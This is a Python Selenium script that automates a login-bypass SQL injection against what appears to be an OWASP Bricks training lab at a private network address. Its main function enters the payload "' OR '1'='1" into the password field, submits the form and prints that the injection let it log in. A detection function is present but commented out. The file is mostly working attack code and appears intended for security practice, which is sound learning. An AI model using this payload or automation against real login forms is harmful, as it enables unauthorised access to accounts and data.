from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
import time

options = Options()
options.binary_location = "/usr/bin/firefox"

service = Service(executable_path='/usr/local/bin/geckodriver')
driver = webdriver.Firefox(service=service, options=options)
driver.get("http://192.168.25.208/owaspbricks/login-1/")


def findingIsSqlInjectionPossible():

    userName = "Demo"
    userNameXPATH = driver.find_element(By.XPATH, '//*[@id="username"]')
    userNameXPATH.send_keys(userName)

    userPassword = "123"
    userPasswordXPATH = driver.find_element(By.XPATH, '//*[@id="passwd"]')
    userPasswordXPATH.send_keys(userPassword)

    submitBtn = driver.find_element(By.XPATH, '//*[@id="submit"]').click()

    textDetail = driver.find_element(By.XPATH, "/html/body/div/div/form/fieldset/div").text
    print("Text Details : ", textDetail)

    queryDetails = driver.find_element(By.XPATH, "/html/body/div/center/div/div").text
    print("Query Details : ", queryDetails)


def performSqlInjection():

    userName = "Tom"
    userNameXPATH = driver.find_element(By.XPATH, '//*[@id="username"]')
    userNameXPATH.send_keys(userName)

    userPassword = "' OR '1'='1"
    print(userPassword)
    userPasswordXPATH = driver.find_element(By.XPATH, '//*[@id="passwd"]')
    userPasswordXPATH.send_keys(userPassword)

    submitBtn = driver.find_element(By.XPATH, '//*[@id="submit"]').click()

    textDetail = driver.find_element(By.XPATH, "/html/body/div/div/form/fieldset/div").text
    print("Text Details : ", textDetail)

    queryDetails = driver.find_element(By.XPATH, "/html/body/div/center/div/div").text
    print("Query Details : ", queryDetails)

    print("SQL Injection Worked. We have successfully inserted a Query which enables us to login into the Application.\n")



# ip = input("Enter the IP Address of OWASP: ")

# url = f"http://192.168.229.208/owaspbricks/login-1/"
# print(url)
# time.sleep(5)


print("Firstly Finding that is SQL Injection is possible of not : \n")

# findingIsSqlInjectionPossible()

performSqlInjection()

time.sleep(4)
driver.close()
